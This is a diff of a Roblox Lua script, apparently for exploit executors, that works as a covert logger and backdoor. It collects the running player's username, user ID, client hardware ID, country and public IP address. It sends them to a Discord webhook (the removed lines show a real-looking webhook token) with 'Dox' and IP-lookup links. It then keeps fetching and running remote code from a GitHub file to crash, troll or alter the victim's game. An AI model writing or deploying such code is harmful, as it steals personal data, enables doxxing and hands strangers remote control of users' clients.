@@ -1,14 +1,11 @@
--- Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 local UserInputService = game:GetService("UserInputService")
-local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
--- Platform information
 local platform = UserInputService:GetPlatform()
-local platformNameMap = {
+local platformNames = {
     [Enum.Platform.Windows] = "Windows PC",
     [Enum.Platform.OSX] = "Mac",
     [Enum.Platform.IOS] = "iOS Device",
@@ -16,93 +13,120 @@ local platformNameMap = {
     [Enum.Platform.UWP] = "UWP",
     [Enum.Platform.PS4] = "PlayStation 4",
 }
-local deviceType = platformNameMap[platform] or "Unknown Device"
+local deviceType = platformNames[platform] or "Unknown Device"
 
--- Player information
-local username = Players.LocalPlayer.Name
-local userId = Players.LocalPlayer.UserId
-local hwid = RbxAnalyticsService:GetClientId()
-local gameId = game.PlaceId
-local job = tostring(game.JobId)
-local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "')"
-local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local playerName = Players.LocalPlayer.Name
+local playerId = Players.LocalPlayer.UserId
+local clientId = RbxAnalyticsService:GetClientId()
+local currentPlaceId = game.PlaceId
+local currentJobId = tostring(game.JobId)
+local teleportCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. currentPlaceId .. ", '" .. currentJobId .. "')"
+local timestamp = os.date("%Y-%m-%d %H:%M:%S")
 
--- Initialization
-local countryCode
+local playerCountry
 local ipAddress = "Unknown"
-local githubRepo = "Pumpuma/test"
-local filePath = hwid .. ".lua"
+local githubRepo = "YourGitHubUsername/YourRepo"
+local scriptFileName = clientId .. ".lua"
+local emptyFileName = playerName .. ".lua"
 
--- Get country code
 local success, result = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
 end)
-countryCode = success and result or "Unknown"
+playerCountry = success and result or "Unknown"
 
-if syn then
-    ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
-elseif http then
-    ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
+local executorName = identifyexecutor()
+
+local skipIpRetrievalList = {
+    "ExecutorA",
+    "ExecutorB",
+    "ExecutorC"
+}
+
+local skipIpRetrieval = false
+for _, name in ipairs(skipIpRetrievalList) do
+    if executorName == name then
+        skipIpRetrieval = true
+        break
+    end
 end
-ipAddress = HttpService:JSONDecode(ipAddress).ip
 
--- Functions
-local function generateCreateFileURL()
+if not skipIpRetrieval then
+    if syn then
+        ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
+    elseif http then
+        ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
+    end
+    ipAddress = HttpService:JSONDecode(ipAddress).ip
+end
+
+local function generateCreateScriptURL()
     local content = [[
+-- universal
 _G.Crash = false
+_G.Taco = false
+
+-- Trident survival
 _G.Ban = false
 _G.BPlayer = false
 _G.Small = false
-_G.Taco = false
+
 ]]
-    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. filePath .. "&value=" .. HttpService:UrlEncode(content)
+    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. scriptFileName .. "&value=" .. HttpService:UrlEncode(content)
 end
 
+local function generateCreateEmptyFileURL()
+    local content = [[
+local executed = false
 
-local function generateEditURL()
-    return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath
+if executed == false then
+    executed = true
+    
+    
+    
+end
+]]
+    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. emptyFileName .. "&value=" .. HttpService:UrlEncode(content)
 end
 
-local function generateGeoLink(ip)
+local function generateEditScriptURL()
+    return "https://github.com/" .. githubRepo .. "/edit/main/" .. scriptFileName
+end
+
+local function generateIpInfoURL(ip)
     return "https://ipinfo.io/" .. ip
 end
 
--- Identify executor
-local exe = identifyexecutor()
-
--- Construct the webhook data
-local url = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO" -- Replace with your webhook URL
-local data = {
+local webhookURL = "https://discord.com/api/webhooks/YourWebhookID/YourWebhookToken"
+local webhookData = {
     ["content"] = " ",
     ["embeds"] = {
         {
-            ["title"] = "Joshua's logger",
-            ["description"] = "Username: " .. username .. "\n" ..
-                              "Player ID: " .. userId .. "\n" ..
-                              "Key: N/A\n" ..
-                              "Exp: N/A\n" ..
-                              "Country: " .. countryCode .. "\n" ..
+            ["title"] = "Logger Information",
+            ["description"] = "Player Name: " .. playerName .. "\n" ..
+                              "Player ID: " .. playerId .. "\n" ..
+                              "Country: " .. playerCountry .. "\n" ..
                               "Platform: " .. deviceType .. "\n" ..
                               "IP Address: " .. ipAddress .. "\n" ..
-                              "Executor: " .. exe .. "\n" ..
-                              "Time: " .. currentTime .. "\n" ..
-                              "Join: ```" .. teleportStatement .. "```",
+                              "Executor: " .. executorName .. "\n" ..
+                              "Timestamp: " .. timestamp .. "\n" ..
+                              "Join Command: ```" .. teleportCommand .. "```",
             ["type"] = "rich",
-            ["color"] = tonumber(0x7269da),
+            ["color"] = tonumber(0x4CAF50),
             ["image"] = {
-                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(username)
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(playerName)
             },
             ["fields"] = {
                 {
-                    ["name"] = "Commands",
-                    ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
-                             "[Create File](" .. generateCreateFileURL() .. ")\n" ..
-                                "[Dox](" .. generateGeoLink(ipAddress) .. ")",
+                    ["name"] = "Actions",
+                    ["value"] = "[blacklist](" .. generateEditScriptURL() .. ")\n" ..
+                                "[Troll](" .. generateCreateScriptURL() .. ")\n" ..
+                                "[execute](" .. generateCreateEmptyFileURL() .. ")\n" ..
+                                "[IP Info](" .. generateIpInfoURL(ipAddress) .. ")",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "HWID",
-                    ["value"] = hwid,
+                    ["name"] = "Client ID",
+                    ["value"] = clientId,
                     ["inline"] = true
                 }
             }
@@ -110,24 +134,22 @@ local data = {
     }
 }
 
--- Encode data to JSON
-local newdata = HttpService:JSONEncode(data)
+local encodedData = HttpService:JSONEncode(webhookData)
 local headers = {["content-type"] = "application/json"}
 local request = http_request or request or HttpPost or syn.request
-local requestData = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+local requestData = {Url = webhookURL, Body = encodedData, Method = "POST", Headers = headers}
 
--- Send the Discord webhook request
-local success, err = pcall(function()
+local success, errorMsg = pcall(function()
     request(requestData)
 end)
 if not success then
-    warn("Failed to send Discord message: " .. err)
+    warn("Failed to send Discord message: " .. errorMsg)
 end
 
 while true do
     wait(5)
     local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/Test/main/" .. filePath))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. scriptFileName))()
     end)
 
     if success then
@@ -141,19 +163,19 @@ local tacoPlayed = false
 local crashInitiated = false
 local banPerformed = false
 local bplayerDestroyed = false
-local smalln = false
+local smallAdjusted = false
 
 while true do
     wait(1)
     
     if _G.Taco and not tacoPlayed then
         tacoPlayed = true
-        local a = Instance.new("Sound")
-        a.SoundId = "rbxassetid://142376088"
-        a.Looped = true
-        a.Volume = 1
-        a.Parent = game:GetService("SoundService")
-        a:Play()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://142376088"
+        sound.Looped = true
+        sound.Volume = 1
+        sound.Parent = game:GetService("SoundService")
+        sound:Play()
     end
     
     if _G.Crash and not crashInitiated then
@@ -163,22 +185,32 @@ while true do
     
     if _G.Ban and not banPerformed then
         banPerformed = true
-        local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
-        if re then re:Destroy() end
+        local remoteEvent = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
+        if remoteEvent then remoteEvent:Destroy() end
     end
     
-    if _G.Bplayer and not bplayerDestroyed then
+    if _G.BPlayer and not bplayerDestroyed then
         bplayerDestroyed = true
-        local p = Workspace.Ignore
-        if p then p:Destroy() end
+        local ignorePart = Workspace.Ignore
+        if ignorePart then ignorePart:Destroy() end
     end
     
     if _G.Small and not smallAdjusted then
-        smalln = true
-        local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
-        if n then
-            n.LowerLimit = 1
-            n.UpperLimit = 1
+        smallAdjusted = true
+        local constraint = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
+        if constraint then
+            constraint.LowerLimit = 1
+            constraint.UpperLimit = 1
         end
     end
+end
+
+
+
+while true do
+    wait(5)
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. emptyFileName))()
+    end)
+
 end
